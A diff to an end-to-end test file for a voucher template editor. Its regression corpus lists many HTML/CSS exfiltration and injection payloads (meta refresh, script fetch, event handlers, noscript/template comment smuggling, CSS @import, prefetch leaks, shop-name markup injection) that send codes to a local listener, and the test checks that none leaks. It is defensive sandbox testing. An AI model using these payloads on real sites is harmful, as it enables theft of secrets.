@@ -23,6 +23,7 @@ import {
 import { createConnection } from "node:net";
 import { homedir, tmpdir } from "node:os";
 import { join, resolve } from "node:path";
+import type { VoucherTemplate } from "../src/lib/types";
 import {
   assertProcessRunning,
   removeBrowserProfile,
@@ -359,177 +360,177 @@ interface Case {
   shopName?: string;
 }
 
-const L = `${listenerOrigin}/x?c={{code}}`;
+const listenerUrl = `${listenerOrigin}/x?c={{code}}`;
 const raw = rawListener.port;
-const V = `<div class="v">{{code}}</div>`;
-const META = `<meta http-equiv="refresh" content="0;url=${L}">`;
+const voucherMarkup = `<div class="v">{{code}}</div>`;
+const META = `<meta http-equiv="refresh" content="0;url=${listenerUrl}">`;
 
 /** The #33 HTML/CSS-only regression corpus. Every case must produce zero leaks. */
 const corpus: Case[] = [
-  { name: "meta refresh plain", html: V + META },
+  { name: "meta refresh plain", html: voucherMarkup + META },
   {
     name: "META uppercase slash",
-    html: V + `<META/http-equiv=refresh content="0;url=${L}">`,
+    html: voucherMarkup + `<META/http-equiv=refresh content="0;url=${listenerUrl}">`,
   },
   {
     name: "meta > inside quoted attr",
-    html: V + `<meta content="0;url=${L}&x=>" http-equiv="refresh">`,
+    html: voucherMarkup + `<meta content="0;url=${listenerUrl}&x=>" http-equiv="refresh">`,
   },
   {
     name: "meta newline in tag",
-    html: V + `<meta\nhttp-equiv="refresh"\ncontent="0;url=${L}">`,
+    html: voucherMarkup + `<meta\nhttp-equiv="refresh"\ncontent="0;url=${listenerUrl}">`,
   },
   {
     name: "meta split by script",
     html:
-      V + `<me<script></script>ta http-equiv="refresh" content="0;url=${L}">`,
+      voucherMarkup + `<me<script></script>ta http-equiv="refresh" content="0;url=${listenerUrl}">`,
   },
   {
     name: "meta dangling no >",
-    html: V + `<meta http-equiv=refresh content=0;url=${L}`,
+    html: voucherMarkup + `<meta http-equiv=refresh content=0;url=${listenerUrl}`,
   },
   {
     name: "meta dangling quoted no >",
-    html: V + `<meta http-equiv="refresh" content="0;url=${L}`,
+    html: voucherMarkup + `<meta http-equiv="refresh" content="0;url=${listenerUrl}`,
   },
-  { name: "dangling <script", html: V + `<script` },
-  { name: "dangling <script src", html: V + `<script src=${L}` },
+  { name: "dangling <script", html: voucherMarkup + `<script` },
+  { name: "dangling <script src", html: voucherMarkup + `<script src=${listenerUrl}` },
   {
     name: "scr<meta>ipt",
-    html: V + `<scr<meta>ipt>fetch("${L}")</scr<meta>ipt>`,
+    html: voucherMarkup + `<scr<meta>ipt>fetch("${listenerUrl}")</scr<meta>ipt>`,
   },
-  { name: "script in card", html: V + `<script>fetch("${L}")</script>` },
+  { name: "script in card", html: voucherMarkup + `<script>fetch("${listenerUrl}")</script>` },
   {
     name: "inline handlers",
     html:
-      V +
-      `<img src="data:," onerror="fetch('${L}')"><svg onload="fetch('${L}')"></svg><button autofocus onfocus="fetch('${L}')">x</button>`,
+      voucherMarkup +
+      `<img src="data:," onerror="fetch('${listenerUrl}')"><svg onload="fetch('${listenerUrl}')"></svg><button autofocus onfocus="fetch('${listenerUrl}')">x</button>`,
   },
   {
     name: "javascript: link autofocus",
-    html: V + `<a href="javascript:fetch('${L}')" autofocus>x</a>`,
+    html: voucherMarkup + `<a href="javascript:fetch('${listenerUrl}')" autofocus>x</a>`,
   },
-  { name: "unclosed svg foreignObject", html: V + `<svg><foreignObject><svg>` },
-  { name: "unclosed math", html: V + `<math><mi>` },
-  { name: "unclosed template", html: V + `<template>` },
-  { name: "unclosed textarea", html: V + `<textarea>` },
-  { name: "unclosed title", html: V + `<title>` },
-  { name: "unclosed style", html: V + `<style>` },
-  { name: "unclosed comment", html: V + `<!--` },
-  { name: "unclosed plaintext", html: V + `<plaintext>` },
-  { name: "unclosed noscript", html: V + `<noscript>` },
-  { name: "stray quote", html: V + `<div class="` },
+  { name: "unclosed svg foreignObject", html: voucherMarkup + `<svg><foreignObject><svg>` },
+  { name: "unclosed math", html: voucherMarkup + `<math><mi>` },
+  { name: "unclosed template", html: voucherMarkup + `<template>` },
+  { name: "unclosed textarea", html: voucherMarkup + `<textarea>` },
+  { name: "unclosed title", html: voucherMarkup + `<title>` },
+  { name: "unclosed style", html: voucherMarkup + `<style>` },
+  { name: "unclosed comment", html: voucherMarkup + `<!--` },
+  { name: "unclosed plaintext", html: voucherMarkup + `<plaintext>` },
+  { name: "unclosed noscript", html: voucherMarkup + `<noscript>` },
+  { name: "stray quote", html: voucherMarkup + `<div class="` },
   {
     name: "noscript comment smuggle (meta)",
-    html: V + `<noscript><!--</noscript>${META}--></noscript>`,
+    html: voucherMarkup + `<noscript><!--</noscript>${META}--></noscript>`,
   },
   {
     name: "noscript comment smuggle (script)",
     html:
-      V +
-      `<noscript><!--</noscript><script>fetch("${L}")</script>--></noscript>`,
+      voucherMarkup +
+      `<noscript><!--</noscript><script>fetch("${listenerUrl}")</script>--></noscript>`,
   },
   {
     name: "template > noscript smuggle (meta)",
     html:
-      V +
+      voucherMarkup +
       `<template><noscript><!--</noscript></template>${META}--></noscript></template>`,
   },
   {
     name: "template > noscript smuggle (script)",
     html:
-      V +
-      `<template><noscript><!--</noscript><script>fetch("${L}")--></noscript></template>`,
+      voucherMarkup +
+      `<template><noscript><!--</noscript><script>fetch("${listenerUrl}")--></noscript></template>`,
   },
   {
     name: "declarative shadow root smuggle",
     html:
-      V +
+      voucherMarkup +
       `<template shadowrootmode="open"><noscript><!--</noscript></template>${META}--></noscript></template>`,
   },
   {
     name: "nested template smuggle",
     html:
-      V +
+      voucherMarkup +
       `<template><template><noscript><!--</noscript></template></template>${META}--></noscript></template></template>`,
   },
   {
     name: "base href",
-    html: V + `<base href="${listenerOrigin}/"><a href="x">x</a>`,
+    html: voucherMarkup + `<base href="${listenerOrigin}/"><a href="x">x</a>`,
   },
   {
     name: "preconnect SNI",
     html:
-      V + `<link rel="preconnect" href="https://{{code}}.localhost:${raw}/">`,
+      voucherMarkup + `<link rel="preconnect" href="https://{{code}}.localhost:${raw}/">`,
   },
   {
     name: "preconnect http",
-    html: V + `<link rel="preconnect" href="http://127.0.0.1:${raw}/">`,
+    html: voucherMarkup + `<link rel="preconnect" href="http://127.0.0.1:${raw}/">`,
   },
   {
     name: "dns-prefetch",
     html:
-      V + `<link rel="dns-prefetch" href="https://{{code}}.localhost:${raw}/">`,
+      voucherMarkup + `<link rel="dns-prefetch" href="https://{{code}}.localhost:${raw}/">`,
   },
   {
     name: "link prefetch",
-    html: V + `<link rel="prefetch" href="${L}&k=prefetch">`,
+    html: voucherMarkup + `<link rel="prefetch" href="${listenerUrl}&k=prefetch">`,
   },
   {
     name: "link preload",
-    html: V + `<link rel="preload" as="image" href="${L}&k=preload">`,
+    html: voucherMarkup + `<link rel="preload" as="image" href="${listenerUrl}&k=preload">`,
   },
   {
     name: "link stylesheet",
-    html: V + `<link rel="stylesheet" href="${L}&k=css">`,
+    html: voucherMarkup + `<link rel="stylesheet" href="${listenerUrl}&k=css">`,
   },
-  { name: "img srcset", html: V + `<img srcset="${L}&k=srcset 1x">` },
-  { name: "img src", html: V + `<img src="${L}&k=img">` },
-  { name: "video poster", html: V + `<video poster="${L}&k=poster"></video>` },
+  { name: "img srcset", html: voucherMarkup + `<img srcset="${listenerUrl}&k=srcset 1x">` },
+  { name: "img src", html: voucherMarkup + `<img src="${listenerUrl}&k=img">` },
+  { name: "video poster", html: voucherMarkup + `<video poster="${listenerUrl}&k=poster"></video>` },
   {
     name: "object/embed",
-    html: V + `<object data="${L}&k=obj"></object><embed src="${L}&k=embed">`,
+    html: voucherMarkup + `<object data="${listenerUrl}&k=obj"></object><embed src="${listenerUrl}&k=embed">`,
   },
   {
     name: "svg image/feImage",
     html:
-      V +
-      `<svg><image href="${L}&k=svgimg"/><filter id=f><feImage href="${L}&k=feimg"/></filter></svg>`,
+      voucherMarkup +
+      `<svg><image href="${listenerUrl}&k=svgimg"/><filter id=f><feImage href="${listenerUrl}&k=feimg"/></filter></svg>`,
   },
   {
     name: "anchor + svg animate href",
     html:
-      V +
-      `<a href="${L}&k=a" target="_self" autofocus>x</a><svg><a><animate attributeName="href" values="${L}&k=anim"/><text y=20>t</text></a></svg>`,
+      voucherMarkup +
+      `<a href="${listenerUrl}&k=a" target="_self" autofocus>x</a><svg><a><animate attributeName="href" values="${listenerUrl}&k=anim"/><text y=20>t</text></a></svg>`,
   },
   {
     name: "form autofocus button",
-    html: V + `<form action="${L}&k=form"><button autofocus>go</button></form>`,
+    html: voucherMarkup + `<form action="${listenerUrl}&k=form"><button autofocus>go</button></form>`,
   },
-  { name: "iframe src", html: V + `<iframe src="${L}&k=iframe"></iframe>` },
+  { name: "iframe src", html: voucherMarkup + `<iframe src="${listenerUrl}&k=iframe"></iframe>` },
   {
     name: "CSS url/@import/@font-face/image-set",
-    html: V,
+    html: voucherMarkup,
     css: `@import url("${listenerOrigin}/x?k=import");@font-face{font-family:F;src:url("${listenerOrigin}/x?k=font")}.v{font-family:F;background:url("${listenerOrigin}/x?k=bg");border-image:image-set("${listenerOrigin}/x?k=iset" 1x) 1}`,
   },
   {
     name: "CSS escape </style> meta",
-    html: V,
+    html: voucherMarkup,
     css: `.v{color:red}</style>${META}<style>`,
   },
   {
     name: "CSS escape </STYLE > script",
-    html: V,
-    css: `.v{color:red}</STYLE ><script>fetch("${L}")</script><style>`,
+    html: voucherMarkup,
+    css: `.v{color:red}</STYLE ><script>fetch("${listenerUrl}")</script><style>`,
   },
   {
     name: "CSS escape </style with comment",
-    html: V,
+    html: voucherMarkup,
     css: `/*</style><meta http-equiv="refresh" content="0;url=${listenerOrigin}/css">*/`,
   },
   {
     name: "markup in token (shop_name)",
-    html: V + `<p>{{shop_name}}</p>`,
+    html: voucherMarkup + `<p>{{shop_name}}</p>`,
     shopName: `"><meta http-equiv=refresh content=0;url=${listenerOrigin}/s>`,
   },
 ];
@@ -549,6 +550,11 @@ interface Outcome {
 }
 
 const PREVIEW = `[data-voucher-render="preview"]`;
+/** The preview renders one card per sample price (VouchersPage SAMPLE_PRICES), all with one sample code. */
+const PREVIEW_CARDS = 4;
+const SAMPLE_CODE = "DEMO-ABCD-2345";
+/** Every corpus case runs this Template Script; a verdict needs it to have run. */
+const CORPUS_SCRIPT = `document.body.dataset.ran = "corpus";`;
 const printFrameSelector = `iframe[data-voucher-print]`;
 
 async function openVouchers(tab: "Template" | "Batches"): Promise<void> {
@@ -569,6 +575,30 @@ async function renderSeq(): Promise<number> {
   );
 }
 
+/**
+ * Wait for the preview to finish a render newer than `before`, then read its
+ * status, error text and frame height.
+ */
+async function settlePreview(
+  label: string,
+  before: number,
+  requireNewRender = true,
+): Promise<Pick<Outcome, "status" | "message" | "frameHeight">> {
+  await waitFor(
+    `(() => { const el = document.querySelector('${PREVIEW}'); return el && ${requireNewRender ? `Number(el.dataset.renderSeq) > ${before} && ` : ""}el.dataset.renderStatus !== 'rendering'; })()`,
+    `preview settles: ${label}`,
+    100,
+  );
+  return evaluate(
+    `(() => { const el = document.querySelector('${PREVIEW}'); return { status: el.dataset.renderStatus, message: el.querySelector('[data-render-error]')?.textContent?.trim() ?? '', frameHeight: el.querySelector('iframe').offsetHeight }; })()`,
+  );
+}
+
+/** In-frame expression: `code` occurs at least `min` times in the document text. */
+function codeCountAtLeast(code: string, min: number): string {
+  return `document.body.textContent.split(${JSON.stringify(code)}).length - 1 >= ${min}`;
+}
+
 /** Type into the Template editors (live preview, no save) and read the outcome. */
 async function previewCase(c: Case): Promise<Outcome> {
   const before = await renderSeq();
@@ -581,26 +611,16 @@ async function previewCase(c: Case): Promise<Outcome> {
     set('voucher-template-css', ${JSON.stringify(c.css ?? "")});
     return changed;
   })()`);
-  await waitFor(
-    `(() => { const el = document.querySelector('${PREVIEW}'); return el && ${changed ? `Number(el.dataset.renderSeq) > ${before} && ` : ""}el.dataset.renderStatus !== 'rendering'; })()`,
-    `preview settles: ${c.name}`,
-    100,
-  );
-  const state = await evaluate<{
-    status: Outcome["status"];
-    message: string;
-    frameHeight: number;
-  }>(
-    `(() => { const el = document.querySelector('${PREVIEW}'); return { status: el.dataset.renderStatus, message: el.querySelector('[data-render-error]')?.textContent ?? '', frameHeight: el.querySelector('iframe').offsetHeight }; })()`,
-  );
-  const outcome: Outcome = { ...state };
-  if (state.status === "ready") {
+  const outcome: Outcome = await settlePreview(c.name, before, changed);
+  if (outcome.status === "ready") {
     outcome.height = await inFrame<number>(
       `Math.ceil(document.documentElement.getBoundingClientRect().height)`,
     );
+    // The cards share one sample code, so each of the cards must carry it.
     outcome.codesPresent = await inFrame<boolean>(
-      `document.body.textContent.includes('DEMO-ABCD-2345')`,
+      codeCountAtLeast(SAMPLE_CODE, PREVIEW_CARDS),
     );
+    outcome.ran = await inFrame<string>(`document.body.dataset.ran ?? ''`);
   }
   return outcome;
 }
@@ -630,29 +650,49 @@ async function runScriptPreview(
   await setEditor("voucher-template-script", script);
   const before = await renderSeq();
   await clickButton("Run");
-  await waitFor(
-    `(() => { const el = document.querySelector('${PREVIEW}'); return Number(el.dataset.renderSeq) > ${before} && el.dataset.renderStatus !== 'rendering'; })()`,
-    `script preview settles: ${name}`,
-    100,
-  );
-  const state = await evaluate<{ status: Outcome["status"]; message: string }>(
-    `(() => { const el = document.querySelector('${PREVIEW}'); return { status: el.dataset.renderStatus, message: el.querySelector('[data-render-error]')?.textContent?.trim() ?? '' }; })()`,
-  );
-  const outcome: Outcome = { ...state };
-  if (state.status === "ready") {
+  const outcome: Outcome = await settlePreview(name, before);
+  if (outcome.status === "ready") {
     outcome.ran = await inFrame<string>(`document.body.dataset.ran ?? ''`);
     outcome.tiers = await inFrame<string>(TIERS_EXPR);
   }
   return outcome;
 }
 
+/** Codes of the E2E batch (3 cards, ₱50). */
 let batchCodes: string[] = [];
 let freeBatchCodes: string[] = [];
 
 const TIERS_EXPR = `Array.from(document.querySelectorAll('.voucher-card')).map((c) => c.dataset.tier ?? '').join(',')`;
 
-/** Save through the API (real PUT), print the batch through the UI, read the outcome. */
-async function printCase(c: Case): Promise<Outcome> {
+/** Open the Batches tab, select the batch whose name contains `prefix` and mark its Print button. */
+async function openBatch(prefix: string, reload = true): Promise<void> {
+  if (reload) await openVouchers("Batches");
+  else await clickButton("Batches");
+  await evaluate(
+    `document.querySelectorAll('[data-e2e-batch],[data-e2e-print]').forEach((el) => { el.removeAttribute('data-e2e-batch'); el.removeAttribute('data-e2e-print'); })`,
+  );
+  await waitFor(
+    `document.body.innerText.includes(${JSON.stringify(prefix)})`,
+    `${prefix} batch listed`,
+  );
+  await evaluate(
+    `Array.from(document.querySelectorAll('button')).find(b => b.textContent.includes(${JSON.stringify(prefix)})).setAttribute('data-e2e-batch','')`,
+  );
+  await click("[data-e2e-batch]");
+  await waitFor(
+    `Array.from(document.querySelectorAll('button')).some(b => b.textContent.trim() === 'Print')`,
+    `${prefix} batch detail`,
+  );
+  await evaluate(
+    `Array.from(document.querySelectorAll('button')).find(b => b.textContent.trim() === 'Print').setAttribute('data-e2e-print','')`,
+  );
+}
+
+/**
+ * Save through the API (real PUT), print the open batch through the UI, read the
+ * outcome. `codes` are the cards of the batch opened with {@link openBatch}.
+ */
+async function printCase(c: Case, codes: string[] = batchCodes): Promise<Outcome> {
   await ownerFetch("PUT", "/web-admin/voucher-template", {
     html: c.html,
     css: c.css ?? "/* e2e */",
@@ -673,7 +713,7 @@ async function printCase(c: Case): Promise<Outcome> {
         `Math.ceil(document.documentElement.getBoundingClientRect().height)`,
       );
       const codesPresent = await inFrame<boolean>(
-        `${JSON.stringify(batchCodes)}.every((code) => document.body.textContent.includes(code))`,
+        codes.map((code) => `(${codeCountAtLeast(code, 1)})`).join(" && "),
       );
       const ran = await inFrame<string>(`document.body.dataset.ran ?? ''`);
       const tiers = await inFrame<string>(TIERS_EXPR);
@@ -690,7 +730,10 @@ async function printCase(c: Case): Promise<Outcome> {
   throw new Error(`print outcome never observed: ${c.name}`);
 }
 
-/** Pass = no leak, and either ready with every code present, or a visible error/timeout. */
+/**
+ * Pass = no leak, and either ready with every card's code present and the
+ * Template Script run, or a visible error/timeout.
+ */
 function judge(
   mode: string,
   c: Case,
@@ -700,7 +743,10 @@ function judge(
 ): void {
   const visibleFailure =
     outcome.status !== "ready" && outcome.message.length > 0;
-  const rendered = outcome.status === "ready" && outcome.codesPresent === true;
+  const rendered =
+    outcome.status === "ready" &&
+    outcome.codesPresent === true &&
+    outcome.ran === "corpus";
   const ok = leaks.length === 0 && (rendered || visibleFailure);
   rows.push({
     mode,
@@ -708,13 +754,22 @@ function judge(
     outcome: outcome.status,
     message: outcome.message,
     codesPresent: outcome.codesPresent,
+    ran: outcome.ran,
     leaks,
   });
   check(
     `corpus ${mode}: ${c.name}`,
     ok,
-    `${outcome.status} ${outcome.message} codes=${outcome.codesPresent} leaks=${JSON.stringify(leaks)}`,
+    `${outcome.status} ${outcome.message} codes=${outcome.codesPresent} ran=${outcome.ran} leaks=${JSON.stringify(leaks)}`,
   );
+}
+
+async function setShopName(shopName: string): Promise<void> {
+  await ownerFetch("PUT", "/web-admin/settings", {
+    shop_name: shopName,
+    shutdown_grace_seconds: 30,
+    offline_grace_seconds: 30,
+  });
 }
 
 function takeLeaks(): string[] {
@@ -914,7 +969,7 @@ try {
     ),
   });
   check(
-    "preview: default template reaches ready with its code",
+    "preview: default template reaches ready with every card's code",
     defaultOutcome.status === "ready" && defaultOutcome.codesPresent === true,
     JSON.stringify(defaultOutcome),
   );
@@ -949,7 +1004,7 @@ try {
     const preview = document.querySelector('${PREVIEW}');
     const style = getComputedStyle(preview);
     return {
-      tabs: Array.from(document.querySelectorAll('[role=tab]')).map(t => t.textContent.trim()),
+      tabs: Array.from(document.querySelectorAll('[data-template-editors] [role=tab]')).map(t => t.textContent.trim()),
       editors: rect('[data-template-editors]'),
       preview: rect('${PREVIEW}'),
       position: getComputedStyle(preview.closest('[data-template-preview]')).position,
@@ -982,11 +1037,24 @@ try {
     desktop.position === "sticky",
     desktop.position,
   );
+  // Any CSS colour syntax (rgb, oklch, ...): let the browser resolve it to sRGB.
+  const background = await evaluate<number[] | null>(`(() => {
+    const ctx = document.createElement('canvas').getContext('2d');
+    ctx.fillStyle = '#ff00ff';
+    ctx.fillStyle = ${JSON.stringify(desktop.background)};
+    if (ctx.fillStyle === '#ff00ff') return null;
+    ctx.clearRect(0, 0, 1, 1);
+    ctx.fillRect(0, 0, 1, 1);
+    return Array.from(ctx.getImageData(0, 0, 1, 1).data);
+  })()`);
   check(
     "layout: preview has a neutral grey background (not white or transparent)",
-    /^rgb\((\d+), \1, \1\)$/.test(desktop.background) &&
-      desktop.background !== "rgb(255, 255, 255)",
-    desktop.background,
+    background !== null &&
+      background[3] === 255 &&
+      Math.abs(background[0] - background[1]) <= 1 &&
+      Math.abs(background[1] - background[2]) <= 1 &&
+      background[0] < 255,
+    `${desktop.background} -> ${JSON.stringify(background)}`,
   );
   check(
     "layout desktop: no horizontal page scroll",
@@ -1072,8 +1140,8 @@ try {
     "preview: frame shrinks with shorter content",
     shrink.status === "ready" &&
       shrink.height !== undefined &&
-      shrink.height >= 40 &&
-      shrink.height < 100 &&
+      shrink.height >= 40 * PREVIEW_CARDS &&
+      shrink.height < 40 * PREVIEW_CARDS + 100 &&
       shrink.frameHeight === shrink.height,
     JSON.stringify(shrink),
   );
@@ -1091,7 +1159,7 @@ try {
   await screenshot("preview-lost-code.png");
 
   const removeSilence = await addHook(SILENCE_HOOK);
-  const never = await previewCase({ name: "never finishes", html: V });
+  const never = await previewCase({ name: "never finishes", html: voucherMarkup });
   check(
     "preview: a render that never reports shows a timeout",
     never.status === "timeout" && never.message.length > 0,
@@ -1101,30 +1169,34 @@ try {
   removeSilence();
 
   // ---- Corpus through the preview.
+  // Every corpus verdict needs the Template Script to have run, so Run the marker first.
+  const armCorpusScript = async () => {
+    await clickButton("Template Script");
+    const armed = await runScriptPreview("corpus script", CORPUS_SCRIPT);
+    check(
+      "corpus preview: the marker Template Script runs",
+      armed.status === "ready" && armed.ran === "corpus",
+      JSON.stringify(armed),
+    );
+  };
+  await armCorpusScript();
   takeLeaks();
   for (const c of corpus) {
     if (c.shopName) {
-      await ownerFetch("PUT", "/web-admin/settings", {
-        shop_name: c.shopName,
-        shutdown_grace_seconds: 30,
-        offline_grace_seconds: 30,
-      });
+      await setShopName(c.shopName);
       await openVouchers("Template");
       await waitFor(
         `document.querySelector('${PREVIEW}')?.dataset.renderStatus === 'ready'`,
         "preview after shop rename",
         100,
       );
+      await armCorpusScript(); // the reload dropped the Run
     }
     const outcome = await previewCase(c);
     await Bun.sleep(300); // let any late request surface
     judge("preview", c, outcome, takeLeaks(), corpusRows);
   }
-  await ownerFetch("PUT", "/web-admin/settings", {
-    shop_name: "OpenPiso Shop",
-    shutdown_grace_seconds: 30,
-    offline_grace_seconds: 30,
-  });
+  await setShopName("OpenPiso Shop");
 
   // ---- Template Script (#41): preview runs only on Run; errors are visible.
   await openVouchers("Template");
@@ -1133,11 +1205,22 @@ try {
     "script editor + preview ready",
     100,
   );
+  await clickButton("Template Script");
   check(
     "script: editor shows the trust warning",
     await evaluate<boolean>(
       `/send voucher codes off this PC/i.test(document.body.innerText) && !/JavaScript is disabled/i.test(document.body.innerText)`,
     ),
+  );
+  const noCode = await previewCase({
+    name: "no code token",
+    html: `<p>no code here</p>`,
+    css: "/* e2e */",
+  });
+  check(
+    "preview: a template without {{code}} shows an error",
+    noCode.status === "error" && /code/i.test(noCode.message),
+    JSON.stringify(noCode),
   );
   const READ_PRICE = `data-price="{{price}}"`;
   await setEditor(
@@ -1161,11 +1244,12 @@ try {
   );
   const ranPreview = await runScriptPreview(
     "reads card data",
-    `document.body.dataset.ran = document.querySelector('[data-price]').dataset.price;`,
+    `document.body.dataset.ran = Array.from(document.querySelectorAll('[data-price]')).map((card) => card.dataset.price).join(',');`,
   );
   check(
-    "script: Run executes it after the cards and it reads card data",
-    ranPreview.status === "ready" && /50/.test(ranPreview.ran ?? ""),
+    "script: Run executes it after the cards and it reads every card's data",
+    ranPreview.status === "ready" &&
+      ranPreview.ran === "₱5.00,₱20.00,₱50.00,₱100.00",
     JSON.stringify(ranPreview),
   );
   const closing = await runScriptPreview(
@@ -1176,6 +1260,15 @@ try {
     "script: </script> and <!-- inside strings and comments work",
     closing.status === "ready" && closing.ran === "ok",
     JSON.stringify(closing),
+  );
+  const ownReport = await runScriptPreview(
+    "declares report",
+    `const report = "owner-report"; document.body.dataset.ran = report;`,
+  );
+  check(
+    "script: an Owner script may declare its own `report` (no bootstrap name leaks)",
+    ownReport.status === "ready" && ownReport.ran === "owner-report",
+    JSON.stringify(ownReport),
   );
   const thrown = await runScriptPreview(
     "throws",
@@ -1225,10 +1318,10 @@ try {
       `document.getElementById('voucher-template-html').value === '<p>{{code}}</p>' && document.getElementById('voucher-template-css').value === 'p { color: red; }' && document.getElementById('voucher-template-script').value === ${JSON.stringify(SAVED)}`,
     ),
   );
-  const stored = (await ownerFetch("GET", "/web-admin/voucher-template")) as {
-    script: string;
-    default_script: string;
-  };
+  const stored = (await ownerFetch(
+    "GET",
+    "/web-admin/voucher-template",
+  )) as VoucherTemplate;
   check(
     "script: API returns the saved script and the price-tier default_script",
     stored.script === SAVED && stored.default_script.includes("data-price"),
@@ -1247,10 +1340,7 @@ try {
   const afterReset = (await ownerFetch(
     "GET",
     "/web-admin/voucher-template",
-  )) as { html: string; css: string; script: string } & {
-    default_html: string;
-    default_css: string;
-  };
+  )) as VoucherTemplate;
   check(
     "script: reset restores HTML, CSS and script",
     afterReset.html === afterReset.default_html &&
@@ -1259,24 +1349,17 @@ try {
   );
 
   // ---- Print path (real Voucher Batch).
-  await openVouchers("Batches");
-  await waitFor(`document.body.innerText.includes('E2E')`, "batch list");
-  await evaluate(
-    `Array.from(document.querySelectorAll('button')).find(b => b.textContent.includes('E2E')).setAttribute('data-e2e-batch','')`,
-  );
-  await click("[data-e2e-batch]");
-  await waitFor(
-    `Array.from(document.querySelectorAll('button')).some(b => b.textContent.trim() === 'Print')`,
-    "batch detail",
-  );
-  await evaluate(
-    `Array.from(document.querySelectorAll('button')).find(b => b.textContent.trim() === 'Print').setAttribute('data-e2e-print','')`,
-  );
+  // Printing fetches the saved template for its own document only: an unsaved
+  // Script edit in the Template editor must survive it.
+  await openVouchers("Template");
+  await clickButton("Template Script");
+  await setEditor("voucher-template-script", "/* unsaved-before-print */");
+  await openBatch("E2E", false);
 
   const defaultHtml = (await ownerFetch(
     "GET",
     "/web-admin/voucher-template",
-  )) as { default_html: string; default_css: string; default_script: string };
+  )) as VoucherTemplate;
   const printDefault = await printCase({
     name: "default",
     html: defaultHtml.default_html,
@@ -1310,6 +1393,14 @@ try {
     60,
   );
   check("print: frame removed after afterprint", true);
+  await clickButton("Template");
+  check(
+    "print: an unsaved Template Script edit survives printing",
+    (await evaluate<string>(
+      `document.getElementById('voucher-template-script').value`,
+    )) === "/* unsaved-before-print */",
+  );
+  await openBatch("E2E");
 
   // Price tiers (#42): the default script on a real batch. The fixture batch is
   // priced ₱50.00, so every card is `high`; a ₱0.00 promo batch gets no tier.
@@ -1329,28 +1420,16 @@ try {
     "tier print frame removed",
     60,
   );
-  await openVouchers("Batches");
-  await waitFor(`document.body.innerText.includes('FREE')`, "free batch listed");
-  await evaluate(
-    `Array.from(document.querySelectorAll('button')).find(b => b.textContent.includes('FREE')).setAttribute('data-e2e-batch','')`,
+  await openBatch("FREE");
+  const freePrint = await printCase(
+    {
+      name: "free batch",
+      html: defaultHtml.default_html,
+      css: defaultHtml.default_css,
+      script: defaultHtml.default_script,
+    },
+    freeBatchCodes,
   );
-  await click("[data-e2e-batch]");
-  await waitFor(
-    `Array.from(document.querySelectorAll('button')).some(b => b.textContent.trim() === 'Print')`,
-    "free batch detail",
-  );
-  await evaluate(
-    `Array.from(document.querySelectorAll('button')).find(b => b.textContent.trim() === 'Print').setAttribute('data-e2e-print','')`,
-  );
-  const freeCodes = batchCodes;
-  batchCodes = freeBatchCodes;
-  const freePrint = await printCase({
-    name: "free batch",
-    html: defaultHtml.default_html,
-    css: defaultHtml.default_css,
-    script: defaultHtml.default_script,
-  });
-  batchCodes = freeCodes;
   check(
     "price tier: a free (₱0.00) batch prints no tier",
     freePrint.status === "ready" && freePrint.tiers === ",,",
@@ -1361,6 +1440,7 @@ try {
     "free print frame removed",
     60,
   );
+  await openBatch("E2E"); // every later print case targets the E2E batch
 
   const printLost = await printCase({
     name: "lost code",
@@ -1371,8 +1451,17 @@ try {
     printLost.status === "error" && printCalls.length === 0,
     JSON.stringify(printLost),
   );
+  const printNoCode = await printCase({
+    name: "no code token",
+    html: `<p>no code here</p>`,
+  });
+  check(
+    "print: a template without {{code}} is blocked with an error",
+    printNoCode.status === "error" && printCalls.length === 0,
+    JSON.stringify(printNoCode),
+  );
   const removeSilence2 = await addHook(SILENCE_HOOK);
-  const printNever = await printCase({ name: "never finishes", html: V });
+  const printNever = await printCase({ name: "never finishes", html: voucherMarkup });
   check(
     "print: a render that never reports times out with a visible error",
     printNever.status === "timeout",
@@ -1418,7 +1507,7 @@ try {
       /timed out/i,
     ],
   ] as const) {
-    const blocked = await printCase({ name, html: V, script });
+    const blocked = await printCase({ name, html: voucherMarkup, script });
     await Bun.sleep(200);
     check(
       `print script: ${name} shows its message and blocks print`,
@@ -1433,10 +1522,12 @@ try {
   }
 
   takeLeaks();
-  for (const c of corpus.filter((x) => !x.shopName)) {
-    const outcome = await printCase(c);
+  for (const c of corpus) {
+    if (c.shopName) await setShopName(c.shopName);
+    const outcome = await printCase({ ...c, script: CORPUS_SCRIPT });
     await Bun.sleep(300);
     judge("print", c, outcome, takeLeaks(), corpusRows);
+    if (c.shopName) await setShopName("OpenPiso Shop");
   }
 } catch (error) {
   failure = error;
